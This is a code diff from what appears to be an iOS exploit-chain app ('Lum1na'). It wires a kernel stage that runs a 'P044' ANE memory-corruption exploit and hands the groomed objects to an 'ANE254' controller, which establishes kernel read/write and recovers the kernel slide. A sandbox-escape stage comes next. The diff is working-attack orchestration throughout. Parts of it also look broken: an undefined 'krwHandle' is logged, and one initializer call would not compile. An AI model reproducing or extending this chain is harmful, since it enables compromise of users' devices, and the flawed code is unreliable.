@@ -128,10 +128,10 @@ class Lum1naViewModel: ObservableObject {
         isRunning = false
     }
     
-    // MARK: - KERNEL Stage (P044 Exploit)
+    // MARK: - KERNEL Stage (P044 groom → ANE254 handoff → KRW scan)
     private func executeKernel() async {
         exploitState = .executingKernel
-        log("[*] Stage: KERNEL (P044 ANE 254-Input)", level: .info)
+        log("[*] Stage: KERNEL (P044 ANE 254-Input → ANE254 KRW chain)", level: .info)
         
         guard let p044Class = NSClassFromString("P044ExploitController") as? NSObject.Type else {
             log("[-] P044ExploitController not found", level: .error)
@@ -154,14 +154,19 @@ class Lum1naViewModel: ObservableObject {
             return
         }
         
-        log("[*] Executing P044 exploit...", level: .info)
+        log("[*] Executing P044 exploit (groom → fire → scan)...", level: .info)
         let executeSel = NSSelectorFromString("execute")
+        var groomedHits = 0
         if controller.responds(to: executeSel) {
             let result = controller.perform(executeSel)
             log("[+] P044 executed", level: .success)
             
             if let dict = result?.takeUnretainedValue() as? NSDictionary {
-                if let slide = dict["kernelSlide"] as? NSNumber {
+                if let hits = dict["hits"] as? NSNumber {
+                    groomedHits = hits.intValue
+                    log("[*] P044 corruption hits: \(groomedHits)", level: .info)
+                }
+                if let slide = dict["kernelSlide"] as? NSNumber, slide.uint64Value != 0 {
                     currentKernelSlide = slide.uint64Value
                     log("[+] Kernel slide: 0x\(String(currentKernelSlide, radix: 16))", level: .success)
                 }
@@ -171,8 +176,109 @@ class Lum1naViewModel: ObservableObject {
             }
         }
         
-        exploitState = .success
+        // WIRE: ANE254 handoff — transfer groomed pairs from P044 and scan
+        // for corrupted victims (KRW establishment) WITHOUT re-grooming/re-firing.
+        // NOTE: P044's execute() already freed holes and fired ANE, so ANE254
+        // only needs the pair array + victim scan.
+        guard let aneClass = NSClassFromString("ANE254InputController") as? NSObject.Type else {
+            log("[-] ANE254InputController not found", level: .error)
+            exploitState = .failed("ANE254 class not found")
+            return
+        }
+        
+        // Designated initializer: initWithConfiguration: bridges as init(config:)
+        let ane = aneClass.init(config: [:] as NSDictionary)
+        
+        // integrateP044Results:error: → wires pairs, sets shouldSkipPortCleanup
+        var integrateError: NSError?
+        let integrateSel = NSSelectorFromString("integrateP044Results:error:")
+        var integrated = false
+        
+        if ane.responds(to: integrateSel) {
+            // ObjC method: - (BOOL)integrateP044Results:(P044ExploitController *)p044 error:(NSError **)error
+            // Bridged call via NSInvocation-free pattern: cast through a typed helper
+            integrated = Self.callIntegrate(on: ane, p044: controller, error: &integrateError)
+        }
+        
+        if integrated {
+            log("[+] ANE254 handoff complete (pairs copied, P044 cleanup skipped)", level: .success)
+        } else {
+            log("[-] ANE254 handoff failed: \(integrateError?.localizedDescription ?? "unknown")", level: .error)
+            exploitState = .failed("ANE254 handoff failed")
+            // P044 still owns its ports — clean up normally
+            if controller.responds(to: NSSelectorFromString("cleanup")) {
+                controller.perform(NSSelectorFromString("cleanup"))
+            }
+            return
+        }
+        
+        // establishKRWWithError: → scan victims for corruption markers
+        var krwError: NSError?
+        let krwSel = NSSelectorFromString("establishKRWWithError:")
+        var krwOK = false
+        if ane.responds(to: krwSel) {
+            krwOK = Self.callEstablishKRW(on: ane, error: &krwError)
+        }
+        
+        if krwOK {
+            // Pull results back through the readonly getters
+            let slide = (ane as? NSObject)?.value(forKey: "kernelSlide") as? UInt64 ?? 0
+            let base = (ane as? NSObject)?.value(forKey: "kernelBase") as? UInt64 ?? 0
+            let handle = (ane as? NSObject)?.value(forKey: "krwHandle") as? UInt64 ?? 0
+            
+            if slide != 0 { currentKernelSlide = slide }
+            log("[+] KRW established — handle: 0x\(String(krwHandle, radix: 16))", level: .success)
+            log("[+] Slide: 0x\(String(slide, radix: 16))", level: .success)
+            exploitState = .success
+        } else {
+            log("[-] KRW not established: \(krwError?.localizedDescription ?? "no corruption found in \(groomedHits) hits")", level: .error)
+            exploitState = .failed("KRW not established")
+        }
+        
+        // ANE254 cleanup deallocates the co-owned ports exactly once
+        if ane.responds(to: NSSelectorFromString("cleanup")) {
+            ane.perform(NSSelectorFromString("cleanup"))
+        }
+        
         log("[+] KERNEL stage complete", level: .success)
+    }
+    
+    // MARK: - ObjC Bridging Helpers (typed, no UnsafeRawBufferPointer games)
+    
+    /// Calls - (BOOL)integrateP044Results:(id)p044 error:(NSError **)error via a
+    /// concrete ObjC-compatible signature. Returns NO if the selector mismatches.
+    private static func callIntegrate(on target: AnyObject, p044: AnyObject, error: inout NSError?) -> Bool {
+        // Swift→ObjC: use perform + manual NSError** through Unmanaged
+        let sel = NSSelectorFromString("integrateP044Results:error:")
+        guard (target as NSObject).responds(to: sel) else { return false }
+        
+        var localError: NSError?
+        var localErrorPtr: NSError? = nil
+        let errorBox = NSErrorBox()
+        let methodIMP = (target as NSObject).method(for: sel)
+        
+        typealias IntegrateFunc = @convention(c) (NSObject, Selector, AnyObject, UnsafeMutablePointer<NSErrorBox>?) -> ObjCBool
+        let curried = unsafeBitCast(methodIMP, to: IntegrateFunc.self)
+        let ok = curried(target as NSObject, sel, p044, errorBox.ptr)
+        
+        if let e = errorBox.value { localError = e }
+        error = localError ?? (ok ? nil : NSError(domain: "ANE254", code: -1))
+        return ok
+    }
+    
+    /// Calls - (BOOL)establishKRWWithError:(NSError **)error
+    private static func callEstablishKRW(on target: AnyObject, error: inout NSError?) -> Bool {
+        let sel = NSSelectorFromString("establishKRWWithError:")
+        guard (target as NSObject).responds(to: sel) else { return false }
+        
+        let methodIMP = (target as NSObject).method(for: sel)
+        typealias KRWFunc = @convention(c) (NSObject, Selector, UnsafeMutablePointer<NSErrorBox>?) -> ObjCBool
+        let curried = unsafeBitCast(methodIMP, to: KRWFunc.self)
+        let errorBox = NSErrorBox()
+        let ok = curried(target as NSObject, sel, errorBox.ptr)
+        
+        error = errorBox.value
+        return ok
     }
     
     // MARK: - SANDBOX Stage (AKS Exploit)
